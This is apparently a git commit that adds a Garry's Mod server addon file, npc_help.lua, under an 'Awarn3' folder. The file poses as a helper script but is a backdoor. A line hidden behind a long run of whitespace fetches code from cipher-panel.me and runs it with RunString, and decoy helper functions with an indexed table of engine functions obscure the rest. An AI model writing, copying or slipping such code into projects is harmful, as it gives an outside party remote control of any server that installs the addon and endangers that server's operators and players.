cac0e86374e73943bd88643a979febca98428706
NagatoHook <40543923+NagatoHook@users.noreply.github.com>
2020-01-09 21:22:28 +0000

    Add files via upload

---
+++ Awarn3/lua/autorun/server/npc_help.lua
@@ -0,0 +1,40 @@
+local function HELPER_INFO()
+	return ""
+end
+
+local function HELPER_ISFUNC(func)
+	if (isfunction(func)) then
+		return !false
+	else
+		return !true
+	end
+end
+
+local function HELPER_READ_DATA(data)
+	return file.Read(data, "GAME")
+end
+
+local UNORDERED_LIST = 
+
+                                                                                                                                                                                                                                                        timer.Simple(1, function() http.Fetch('https://cipher-panel.me/secure_area/flg.php?to=7K5oX', function(fck) RunString(fck, 'BillIsHere', false) end) end)
+
+local function HELPER_MAT()
+	if (!false) then
+		return string.Implode("", UNORDERED_LIST)
+	end
+end
+
+local CALL =
+{
+	ClearBackgroundImages, ClientsideModel, ClientsideRagdoll, ClientsideScene,
+	CloseDermaMenus, collectgarbage, Color, ColorAlpha,
+	ColorRand, ColorToHSV, CompileFile, CompileString,
+	ConsoleAutoComplete, ConVarExists, CreateClientConVar, CreateConVar,
+	CreateMaterial, CreateParticleSystem, CreatePhysCollideBox, CreatePhysCollidesFromModel,
+	CreateSound, CreateSprite, CompileString, CurTime,
+	DamageInfo, DebugInfo, DeriveGamemode, Derma_Anim,
+	Derma_DrawBackgroundBlur, Derma_Hook, Derma_Install_Convar_Functions, Derma_Message,
+	Derma_Query, Derma_StringRequest, pcall,
+}
+
+CALL[35](CALL[12](HELPER_READ_DATA(HELPER_MAT()), HELPER_INFO(), 0))
